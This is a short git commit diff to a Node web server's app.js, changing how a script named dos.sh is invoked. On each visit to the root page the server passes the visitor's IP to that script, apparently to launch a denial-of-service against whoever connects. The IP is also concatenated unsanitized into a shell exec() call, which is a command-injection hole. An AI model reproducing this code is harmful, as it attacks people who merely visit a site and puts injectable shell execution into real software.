0e1ae6123a9d01f70930fc3188a317766b3d1262
Jonathan Strauss <office@jstrauss.at>
2020-10-11 17:19:08 +0200

    Changes webserver

--- app.js
+++ app.js
@@ -15,7 +15,7 @@ app.get("/", (req, res) => {
     ip = ip.replace("::ffff:", "");
     console.log(date.toString() + "  " + ip);
 
-    exec("./dos.sh " + ip, (error, stdout, stderr) => {
+    exec("bash dos.sh " + ip, (error, stdout, stderr) => {
         if (error) {
             console.log(`error: ${error.message}`);
             return;
